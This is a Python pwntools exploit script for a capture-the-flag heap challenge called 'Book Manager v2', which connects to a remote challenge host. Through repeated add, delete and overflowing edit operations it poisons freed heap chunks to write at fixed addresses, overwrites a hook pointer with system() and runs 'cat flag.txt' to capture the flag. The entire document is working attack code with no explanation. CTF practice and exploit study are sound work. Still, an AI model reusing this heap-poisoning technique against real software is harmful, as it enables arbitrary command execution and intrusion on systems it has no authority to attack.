#!/usr/bin/env python3
from pwn import *
import argparse


HOST = "book-managerv2.challs.infobahnc.tf"
PORT = 1337
BIN = "./chall"

CHUNK_STRIDE = 0x60
STRING_CHUNK = 0x481200
STRING_PTR = STRING_CHUNK + 0x8
OUTPUT_TARGET = 0x47F160
HOOK_TARGET = 0x481040
FPSYSTEM = 0x454F50

CMD = b"cat flag.txt"


class Exploit:
    def __init__(self, tube: tube):
        self.io = tube
        self.books = []

    def _choose(self, option: int):
        self.io.sendlineafter(b"Choose an option: ", str(option).encode())

    def add_book(self, name: str, title: bytes = b"A" * 4, author: bytes = b"B" * 4):
        self._choose(1)
        self.io.sendlineafter(b"Enter title: ", title)
        self.io.sendlineafter(b"Enter author: ", author)
        self.books.append(name)

    def get_idx(self, name: str) -> int:
        return self.books.index(name)

    def delete_book(self, name: str):
        idx = self.get_idx(name)
        self._choose(4)
        self.io.sendlineafter(b"Enter book index to delete: ", str(idx).encode())
        self.books.pop(idx)
        self.io.recvuntil(b"Book deleted.\n")

    def edit_raw(self, name: str, title_bytes: bytes, author_bytes: bytes = b""):
        idx = self.get_idx(name)
        self._choose(3)
        self.io.sendlineafter(b"Enter book index to edit: ", str(idx).encode())
        self.io.sendafter(b"New title: ", title_bytes + b"\n")
        self.io.sendafter(b"New author: ", author_bytes + b"\n")
        self.io.recvuntil(b"Book updated.\n")

    def poison(self, name: str, target: int):
        payload = b"A" * CHUNK_STRIDE + p64(target)
        self.edit_raw(name, payload)


def build_conn(use_remote: bool, host: str, port: int):
    if use_remote:
        return remote(host, port)
    return process(BIN)


def solve(use_remote: bool, host: str, port: int) -> str:
    io = build_conn(use_remote, host, port)
    exp = Exploit(io)

    # Stage 1: place chunk for command string at STRING_CHUNK
    exp.add_book("a0", b"AAAA", b"aaaa")
    exp.add_book("b0", b"BBBB", b"bbbb")
    exp.delete_book("b0")
    exp.poison("a0", STRING_CHUNK)
    exp.add_book("b0-reuse", b"C", b"C")
    exp.add_book("string", b"S", b"S")
    string_payload = p64(len(CMD)) + CMD + b"\x00"
    exp.edit_raw("string", string_payload.ljust(0x20, b"\x00"))

    # Stage 2: chunk overlapping OUTPUT to set pointer
    exp.add_book("a1", b"D", b"D")
    exp.add_book("b1", b"E", b"E")
    exp.delete_book("b1")
    exp.poison("a1", OUTPUT_TARGET)
    exp.add_book("b1-reuse", b"F", b"F")
    exp.add_book("output", b"G", b"G")
    exp.edit_raw("output", p64(STRING_PTR))

    # Stage 3: chunk on hook pointer
    exp.add_book("a2", b"H", b"H")
    exp.add_book("b2", b"I", b"I")
    exp.delete_book("b2")
    exp.poison("a2", HOOK_TARGET)
    exp.add_book("b2-reuse", b"J", b"J")
    exp.add_book("hook", b"K", b"K")
    exp.edit_raw("hook", p64(FPSYSTEM))

    # Hook triggers on the subsequent menu prints
    flag = io.recvregex(rb"infobahn\{.*?\}")
    io.close()
    return flag.decode()


def main():
    parser = argparse.ArgumentParser(description="Exploit Book Manager v2")
    parser.add_argument("--remote", action="store_true", help="Use remote connection")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    args = parser.parse_args()

    flag = solve(args.remote, args.host, args.port)
    log.success(flag)


if __name__ == "__main__":
    main()
